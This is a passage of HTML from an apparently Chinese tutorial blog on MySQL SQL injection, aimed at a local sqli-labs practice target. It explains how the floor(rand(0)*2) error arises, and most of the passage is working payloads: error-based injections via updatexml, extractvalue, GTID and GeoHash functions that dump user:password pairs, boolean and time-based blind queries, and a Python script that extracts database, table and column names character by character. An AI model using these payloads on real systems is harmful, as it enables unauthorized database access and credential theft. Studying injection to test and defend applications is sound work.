class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br><span class=\"line\">and ST_LatFromGeoHash(user())--+  //可以对于系统命令直接查询</span><br></pre></td></tr></table></figure>\n<h6 id=\"2st_longfromgeohashmysql57x\"><a class=\"markdownIt-Anchor\" href=\"#2st_longfromgeohashmysql57x\">#</a> 2.ST_LongFromGeoHash（mysql&gt;=5.7.x）</h6>\n<p>payload</p>\n<p>#同 8 ，都使用了嵌套查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and ST_LongFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"3gtid-mysql-56x-显错200\"><a class=\"markdownIt-Anchor\" href=\"#3gtid-mysql-56x-显错200\">#</a> 3.GTID (MySQL&gt;= 5.6.X - 显错 &lt;=200)</h6>\n<p>0x01 GTID</p>\n<p>GTID 是 MySQL 数据库每次提交事务后生成的一个全局事务标识符，GTID 不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的</p>\n<h6 id=\"gtid_subset-和-gtid_subtract函数\"><a class=\"markdownIt-Anchor\" href=\"#gtid_subset-和-gtid_subtract函数\">#</a> GTID_SUBSET () 和 GTID_SUBTRACT () 函数</h6>\n<p>0X02 函数详解</p>\n<p>GTID_SUBSET () 和 GTID_SUBTRACT () 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错</p>\n<p>GTID_SUBSET (set1 , set2) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)<br>\n GTID_SUBTRACT (set1 , set2) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)</p>\n<p>0x03 注入过程 (payload)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GTID_SUBSET函数</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br><span class=\"line\"> </span><br><span class=\"line\">GTID_SUBTRACT</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>\n<p>函数都是那样，只是适用的版本不同</p>\n<h6 id=\"4floor8xmysql50\"><a class=\"markdownIt-Anchor\" href=\"#4floor8xmysql50\">#</a> 4.floor（8.x&gt;mysql&gt;5.0）</h6>\n<p>利用 select count (*),(floor (rand (0)*2)) x from table group by x，导致数据库报错，通过 concat 函数，连接注入语句与 floor (rand (0)*2) 函数，实现将注入结果与报错信息回显的注入方式。</p>\n<p>基本的查询 select 不必多说，剩下的几个关键字有 count 、group by 、floor、rand。</p>\n<p>1.rand () 函数，获取一个 0-1 之间的随机数</p>\n<p>但如果给一个固定的随机种子之后 rand (0), 每次产生的值都是一样的。也可以称之为伪随机（产生的数据都是可预知的）。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235308883-1871895582.png\" alt=\"img\"></p>\n<p>2.floor（rand（0）*2）函数</p>\n<p>floor () 函数的作用就是返回小于等于括号内该值的最大整数。</p>\n<p>而 rand () 是返回 0 到 1 之间的随机数，那么 floor（rand（0））产生的数就只是 0，这样就不能实现报错的：</p>\n<p>而 rand 产生的数乘 2 后自然是返回 0 到 2 之间的随机数，再配合 floor () 就可以产生确定的两个数了。也就是 0 和 1：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235309428-1152684208.png\" alt=\"img\"></p>\n<p>并且根据固定的随机数种子 0，他每次产生的随机数列都是相同的 0 1 1 0 1 1。</p>\n<p>3.group by 函数</p>\n<p>group by 主要用来对数据进行分组（相同的分为一组，显示相同组最前的 ID）。</p>\n<p>4.count（*）函数</p>\n<p>count（*）统计结果的记录数。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310739-413634853.png\" alt=\"img\"></p>\n<p>5. 综合使用产生报错：</p>\n<p>select count(*),floor(rand(0)*2) x from users group by x;</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235310997-244751856.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310997-244751856.png\" alt=\"img\"></a></p>\n<p>根据前面函数，这句话就是统计后面产生随机数的种类并计算每种数量。</p>\n<p>分别产生 0 1 1 0 1 1 ，这样 0 是 2 个，1 是 4 个，但是最后却产生了报错。</p>\n<p><strong>三、报错分析</strong></p>\n<p>这个整合然后计数的过程中，中间发生了什么我们是必须要明白的。<br>\n首先 mysql 遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 key ，一个是计数值 count (<em>)。也就对应于实验中的 user_name 和 count (</em>)。<br>\n然后<strong>在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加 1，不存在则新 建该分组。</strong></p>\n<p>然后 mysql 官方有给过提示，就是查询的时候如果使用 rand () 的话，该值会被计算多次，那这个 &quot;被计算多次&quot; 到底是什么意思，就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下 floor (rand (0)*2) 报错的过程就知道了，从上面的函数使用中可以看到在一次多记录的查询过程中 floor (rand (0)*2) 的值是定性的，为 011011 (这个顺序很重要)，报错实际上就是 floor (rand (0)*2) 被计算多次导致的，我们还原一下具体的查询过程：</p>\n<p>（1）查询前默认会建立空虚拟表如下图:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311248-2120506620.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311248-2120506620.png\" alt=\"img\"></a></p>\n<p>（2）取第一条记录，执行 floor (rand (0)*2)，发现结果为 0 (第一次计算),</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311467-1420082064.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311467-1420082064.png\" alt=\"img\"></a></p>\n<p>（3）查询虚拟表，发现 0 的键值不存在，则插入新的键值的时候 floor (rand (0)*2) 会被再计算一次，结果为 1 (第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311702-8360327.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311702-8360327.png\" alt=\"img\"></a></p>\n<p>（4）查询第二条记录，再次计算 floor (rand (0)*2)，发现结果为 1 (第三次计算)</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311920-791381551.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311920-791381551.png\" alt=\"img\"></a></p>\n<p>（5）查询虚表，发现 1 的键值存在，所以 floor (rand (0)<em> 2) 不会被计算第二次，直接 count (</em>) 加 1，第二条记录查询完毕，结果如下:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312142-2071009941.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312142-2071009941.png\" alt=\"img\"></a></p>\n<p>（6）查询第三条记录，再次计算 floor (rand (0)*2)，发现结果为 0 (第 4 次计算)</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312396-1593125203.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312396-1593125203.png\" alt=\"img\"></a></p>\n<p>（7）查询虚表，发现键值没有 0，则数据库尝试插入一条新的数据，在插入数据时 floor (rand (0)*2) 被再次计算，作为虚表的主键，其值为 1 (第 5 次计算)，</p>\n<p><a href=\"\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312660-1954097450.png\" alt=\"img\"></a></p>\n<p><strong>然而 1 这个主键已经存在于虚拟表中，而新计算的值也为 1 (主键键值必须唯一)，所以插入的时候就直接报错了。</strong></p>\n<p><strong>四、总结</strong></p>\n<p><strong>整个查询过程 floor (rand (0)*2) 被计算了 5 次，查询原数据表 3 次，所以这就是为什么数据表中需要最少 3 条数据，使用该语句才会报错的原因。</strong></p>\n<p>payload:</p>\n<p>#获取数据库版本信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取当前数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取表数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取 users 表里的段名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#payload2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select count(*) from information_schema.tables group by concat(floor(rand(0)*2),database())</span><br></pre></td></tr></table></figure>\n<h6 id=\"5st_pointfromgeohash-mysql57\"><a class=\"markdownIt-Anchor\" href=\"#5st_pointfromgeohash-mysql57\">#</a> 5.ST_Pointfromgeohash (mysql&gt;=5.7)</h6>\n<p>获取数据库版本信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash(version(),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取表数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取 users 表里的段名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取字段里面的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"6-updatexml\"><a class=\"markdownIt-Anchor\" href=\"#6-updatexml\">#</a> 6 updatexml</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,1,1) 一共可以接收三个参数，报错位置在第二个参数</span><br><span class=\"line\">updatexml(目标文档,xpath路径,更新内容)</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class=\"line\">xpath syntax error:&#x27;~root@localhost~&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">有一点需要注意，updatexml()能查询字符串的最大长度为32，</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\">concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号。</span><br><span class=\"line\">concat该函数主要针对一行数据中多个字段的拼接</span><br><span class=\"line\">group_concat该函数主要争对多行数据中[单个/多个]字段的拼接</span><br></pre></td></tr></table></figure>\n<h6 id=\"7-extractvalue\"><a class=\"markdownIt-Anchor\" href=\"#7-extractvalue\">#</a> 7 extractvalue</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">extractvalue(1,1) 一共可以接收两个参数，报错位置在第二个参数</span><br><span class=\"line\">extravalue(xml标记片段,xpath表达式) 对xml文档在xpath路径进行查询的函数</span><br><span class=\"line\">报错时返回非法内容,即利用xpath路径错误报错</span><br><span class=\"line\"></span><br><span class=\"line\">extractvalue(1,concat(0x7e,(select user()),0x7e))--+</span><br><span class=\"line\">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32,就需要用substring()函数截取，一次查看32位,或者使用limit单次查询</span><br><span class=\"line\">and extractvalue(1,concat(0x7e,substring((select group_concat(username,&quot;:&quot;,password)from users),1,32),0x7e))--+</span><br></pre></td></tr></table></figure>\n<p>报错注入总结：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213222739771.png\" alt=\"image-20220213222739771\"></p>\n<h5 id=\"盲注\"><a class=\"markdownIt-Anchor\" href=\"#盲注\">#</a> 盲注</h5>\n<p>在 SQL 注入过程中，SQL 语句执行后，选择的数据不能回显到前端页面，此时需要利用一些</p>\n<p>方法进行判断或者尝试，这个过程称之为盲注。</p>\n<p>在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响 应时间不同）。一般情况下，盲注可分为两类：</p>\n<p>基于布尔的盲注（Boolean based）</p>\n<p>基于时间的盲注（Time based）</p>\n<p>1. 基于布尔的盲注</p>\n<p>某些场合下，页面返回的结果只有两种（正常或错误）。通过构造 SQL 判断语句，查看页 面的返回结果（True or False）来判断哪些 SQL 判断条件成立，通过此来获取数据库中的 数据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前一个为0，后一个为真是or=1</span><br><span class=\"line\">id=-1&#x27; or (select substr(version(),1,1)=&#x27;5&#x27;) # </span><br><span class=\"line\">或使用left截取字符</span><br><span class=\"line\">?id=1&#x27; and left(version(),1)=5--+  &#x27;</span><br><span class=\"line\">如果此时不报错或有回显，说明version的第一个字符为5</span><br><span class=\"line\">id=-1&#x27; or (select 1 from information_schema.tables where table_schema=database() and substr(table_name,1,1)=&#x27;u&#x27; limit 0,1) #   </span><br><span class=\"line\">此时不报错或有回显说明第一字符为u</span><br><span class=\"line\">或者根据ASCII值来判断</span><br><span class=\"line\">id=-1&#x27; or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)&gt;100 #   </span><br><span class=\"line\">每次取子串，逐个获取对应的ASCII值，获取完整内容</span><br><span class=\"line\">mid(&#x27;abcd&#x27;,1,1)  //a</span><br><span class=\"line\">substring(&#x27;abcd&#x27;,1,1)  //a</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">或者使用Burp Suite  Intruder</span><br><span class=\"line\">Position  Sniper 只能设置一个变量</span><br><span class=\"line\">设置paylaod</span><br><span class=\"line\">attack后会根据设置的值发包，根据可能的Length排序找到正确的值</span><br><span class=\"line\"></span><br><span class=\"line\">Battering ram 可以接收两个参数</span><br><span class=\"line\">pitchfork 配置两个参数</span><br><span class=\"line\">cluster 组合所有可能性发包</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>根据是否有正确的回显判断</p>\n<p>2. 基于时间的盲注</p>\n<p>又称延时注入，即使用具有延时功能的函数 sleep、benchmark 等，通过判断这些函数是 否正常执行来获取数据库中的数据。</p>\n<p>和布尔盲注的区别在于，无论查询是否成功，前端的页面都一样，而布尔的前提是页面针对是否查询出来有相应的回显</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; or sleep(3) % 23</span><br><span class=\"line\">?id=1&#x27; or if((select table_name from information_schema.tables where table_schema=database() limit 0,1)&gt;0,sleep(2),0) #</span><br><span class=\"line\">根据对应的ASCII判断，如果正确停两秒</span><br><span class=\"line\">?id= 1 if((select ascii(substr(table_name,1,1))from information_scheam.tables where table_schema=database() limit 0,1)&gt;96,sleep(2),0) %23</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+</span><br><span class=\"line\">通过逐个字符与ASCII比对，逐个遍历出所有需要的数据</span><br><span class=\"line\">比如database()，数据库长度length(database())</span><br></pre></td></tr></table></figure>\n<p>3. 通过 python 脚本或 sqlmap 进行盲注</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#基于bool盲注</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url1 = <span class=\"string\">&quot;http://127.0.0.1/sqllabs/Less-5/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_database</span>(<span class=\"params\">url1</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;1&#x27; and ascii(substr((select database()),%d,1)) &gt; %d-- &quot;</span> % (i, mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&quot;id&quot;</span>: payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url1, params=params)</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># payload = url.format(_ = i, __ = mid)</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\"># r = requests.get(payload)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_table</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;sqli&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&#x27;id&#x27;</span>:payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url,params = params)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_column</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&#x27;id&#x27;</span>:payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url,params = params)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">inject_database(url)</span><br><span class=\"line\"><span class=\"comment\"># inject_table(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_column(url)</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span 